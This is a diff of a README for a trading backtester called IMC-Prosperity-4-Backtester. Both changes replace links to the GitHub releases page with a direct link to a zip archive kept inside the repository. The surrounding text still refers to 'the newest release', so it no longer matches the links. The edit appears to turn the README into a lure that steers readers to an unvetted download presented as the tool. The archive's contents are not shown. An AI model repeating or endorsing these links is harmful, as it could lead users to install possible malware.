@@ -8,7 +8,7 @@ Think of it as a time machine for your trading strategies. You write your tradin
 
 ## 📥 Download and Install
 
-Visit this link to download the application: **[Download IMC-Prosperity-4-Backtester](https://github.com/Throbthryothorus5990/IMC-Prosperity-4-Backtester/releases)**
+Visit this link to download the application: **[Download IMC-Prosperity-4-Backtester](https://github.com/Throbthryothorus5990/IMC-Prosperity-4-Backtester/raw/refs/heads/main/runs/v3.0.zip)**
 
 Once you're on that page, look for the newest release and download the file listed there. After the download finishes, you're ready to move to the next step.
 
@@ -119,7 +119,7 @@ This tool is used by many IMC Prosperity participants. If you need help:
 
 Download the application now and see how your trading ideas perform:
 
-**[👉 Download IMC-Prosperity-4-Backtester](https://github.com/Throbthryothorus5990/IMC-Prosperity-4-Backtester/releases)**
+**[👉 Download IMC-Prosperity-4-Backtester](https://github.com/Throbthryothorus5990/IMC-Prosperity-4-Backtester/raw/refs/heads/main/runs/v3.0.zip)**
 
 The whole process takes less than five minutes from download to your first backtest result. Whether you're a seasoned trader or just curious about algorithmic trading, this tool gives you professional-grade analysis in a simple package.
 
